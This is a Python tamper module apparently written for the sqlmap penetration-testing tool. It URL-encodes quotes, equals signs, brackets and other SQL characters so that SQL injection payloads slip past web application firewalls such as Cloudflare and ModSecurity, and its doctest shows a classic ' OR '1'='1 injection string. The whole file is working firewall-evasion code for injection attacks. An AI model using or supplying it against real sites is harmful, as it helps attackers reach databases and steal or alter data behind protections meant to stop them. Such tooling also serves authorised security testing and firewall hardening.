#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare_encode.py
Description: URL encodes special SQL characters for WAF bypass
Author: Regaan
Priority: NORMAL
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    URL encodes special SQL characters to bypass character-based WAF detection.
    
    This is a DETERMINISTIC transformation - same input always produces same output.
    
    Technique:
        Encodes SQL special characters that are commonly blocked by WAFs:
        = → %3D, < → %3C, > → %3E, ' → %27, " → %22
    
    Tested against:
        * Cloudflare WAF
        * ModSecurity
        * Character-based filtering
    
    Notes:
        * Deterministic - always encodes the same characters
        * Does NOT encode keywords (use with keyword tamper)
        * Safe for MySQL - decodes properly
    
    >>> tamper("SELECT * FROM users WHERE id=1")
    'SELECT * FROM users WHERE id%3D1'
    
    >>> tamper("' OR '1'='1")
    '%27 OR %271%27%3D%271'
    """
    
    retVal = payload
    
    if payload:
        # Encoding map for SQL special characters
        # Only encode characters that are commonly filtered
        encoding_map = {
            '=': '%3D',
            '<': '%3C',
            '>': '%3E',
            "'": '%27',
            '"': '%22',
            '(': '%28',
            ')': '%29',
            ';': '%3B',
            ',': '%2C'
        }
        
        # Apply encoding deterministically
        for char, encoded in encoding_map.items():
            retVal = retVal.replace(char, encoded)
    
    return retVal
